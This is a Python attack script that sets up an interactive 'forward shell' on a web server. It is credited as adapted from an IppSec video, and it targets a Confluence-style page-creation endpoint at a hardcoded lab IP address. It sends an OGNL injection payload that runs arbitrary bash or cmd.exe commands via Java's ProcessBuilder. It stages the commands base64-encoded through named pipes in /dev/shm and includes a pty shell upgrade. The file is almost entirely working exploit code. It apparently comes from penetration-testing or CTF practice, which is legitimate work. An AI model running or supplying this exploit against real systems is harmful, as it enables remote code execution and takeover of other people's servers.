#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf


import base64
import random
import requests
import threading
import time
from bs4 import BeautifulSoup

class WebShell(object):

    def __init__(self, interval=1.5, proxies='http://127.0.0.1:8080'):
        # MODIFY THIS, URL
        self.url = r"http://192.168.245.171:8090/pages/createpage-entervariables.action?SpaceKey=x"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | sh 2>&1 > {self.stdout}"
        cmd = MakeNamedPipes
        b64cmd = base64.b64encode(cmd.rstrip().encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d | bash'
        self.RunRawCmd(stage_cmd, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()


    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/usr/bin/cat {self.stdout}"
        while True:
            cmd = GetOutput
            b64cmd = base64.b64encode(cmd.rstrip().encode('utf-8')).decode('utf-8')
            stage_cmd = f'echo {b64cmd} | base64 -d | bash'
            result = self.RunRawCmd(stage_cmd) #, proxy=None)
            if result:
                soup = BeautifulSoup(result, 'html.parser')
                queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
                if "java.lang.ProcessBuilder" not in queryStringValue:
                    print(queryStringValue.replace('aaaaaaaa[', '') .replace(']', ''))
                #print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                cmd = ClearOutput
                b64cmd = base64.b64encode(cmd.rstrip().encode('utf-8')).decode('utf-8')
                stage_cmd = f'echo {b64cmd} | base64 -d | bash'
                self.RunRawCmd(stage_cmd)
            time.sleep(self.interval)
        
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        #print(f"Going to run cmd: {cmd}")
        # MODIFY THIS: This is where your payload code goes
        
        payload = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}
       
        # MODIFY THIS
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", 
                       "Connection": "close", 
                       "Content-Type": "application/x-www-form-urlencoded", 
                       "Accept-Encoding": "gzip, deflate"}

        data = payload


        try:
            r = requests.post(self.url, headers=headers, data=data, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        # b64cmd = base64.b64encode(''.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        b64cmd = base64.b64encode(cmd.rstrip().encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}; echo "" >> {self.stdin}'

        b64stage = base64.b64encode(stage_cmd.rstrip().encode('utf-8')).decode('utf-8')
        stage_stage = f'echo {b64stage} | base64 -d | bash'

        self.RunRawCmd(stage_stage)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell)

prompt = "fwd_shell> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)

